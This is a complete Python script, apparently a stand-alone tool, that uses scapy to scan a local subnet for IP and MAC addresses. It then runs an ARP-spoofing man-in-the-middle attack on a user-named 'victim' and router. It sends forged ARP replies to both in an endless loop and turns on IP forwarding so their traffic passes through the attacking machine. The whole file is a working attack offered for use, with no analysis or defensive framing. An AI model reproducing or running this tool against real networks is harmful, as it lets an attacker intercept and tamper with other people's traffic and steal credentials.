import scapy.all as scapy
import os
import time
import socket
import sys

try:
    ip=raw_input("Enter network IP x.x.x.x/CIDR : ")
    arp_request=scapy.ARP(pdst=ip)
    ether_frame=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    packet=ether_frame/arp_request
    answered=scapy.srp(packet,timeout=1,verbose=False)[0]
except (socket.gaierror,EOFError,NameError,KeyboardInterrupt,ValueError) as e:
    print("[INFO] Exiting program...")
    exit()
except socket.error:
    print("[ERROR] Run as Root User...")
    exit()

print("IP Address\t\tMAC Address")
for element in answered:
    print(element[1].psrc+"\t\t"+element[1].hwsrc)

try:
    dst_ip=raw_input("Enter victim IP: ")
    dst_mac=raw_input("Enter victim MAC: ")
    src_routerip=raw_input("Enter router IP: ")
    router_mac=raw_input("Enter router MAC: ")
    packets_sent = 0
except (socket.gaierror,EOFError,NameError,KeyboardInterrupt,ValueError) as e:
    print("[INFO] Exiting program...")
    exit()
try:
    ip_forward_flag=1
    while True:
        packet_to_victim = scapy.ARP(op=2, pdst=dst_ip, hwdst=dst_mac, psrc=src_routerip)
        packet_to_router = scapy.ARP(op=2, pdst=src_routerip, hwdst=router_mac, psrc=dst_ip)
        scapy.send(packet_to_victim,verbose=False)
        scapy.send(packet_to_router,verbose=False)
        if ip_forward_flag==1:
            print("[INFO] Enabling IP Forwarding...")
            os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
            print("[INFO] Done!")
            ip_forward_flag=0
        packets_sent = packets_sent + 2
        print("\r[INFO] Packets Sent = " + str(packets_sent)),
        sys.stdout.flush()
        #print("\r[INFO] Packets Sent = " + str(packets_sent),end="")
        time.sleep(2)
except (socket.gaierror,EOFError, NameError, KeyboardInterrupt,ValueError) as e:
    print("[INFO] Exiting program...")
    exit()
